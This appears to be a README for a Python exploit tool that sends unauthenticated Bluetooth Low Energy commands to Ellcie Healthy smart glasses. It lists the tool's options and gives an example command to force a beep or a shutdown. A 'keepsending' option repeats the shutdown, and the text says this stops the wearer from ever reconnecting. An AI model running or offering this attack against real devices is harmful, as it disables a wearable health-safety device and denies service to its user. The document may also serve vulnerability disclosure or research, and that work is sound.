# Ellcie Healthy glasses : Remote Command Execution
usage: ellcieExploiter.py [-h] --address ADDRESS --action {BEEP,SHUTDOWN}   [--init {1,0}] [--keepsending {1,0}]


Ellcie-Healthy glasses - Remote Command Execution


optional arguments:

  -h, --help            show this help message and exit
 
 --address ADDRESS     Glasses BLE addresses
 
 --action {BEEP,SHUTDOWN} Action to be executed
 
 --init {1,0}          Should the script activate bluetooth
 
 --keepsending {1,0}   Should we keep sending the request ? Doing so will
                        constantly send the action. That means for example if
                        you jam the device and send the shutdown request, the
                        user won't be able to reconnect again, as the device
                        with again and again shutdown.


### Exemple 
python3 ellcieExploiter.py  --address=E7:60:74:B4:98:3E --init=0 --keepsending=1 --action=SHUTDOWN -h
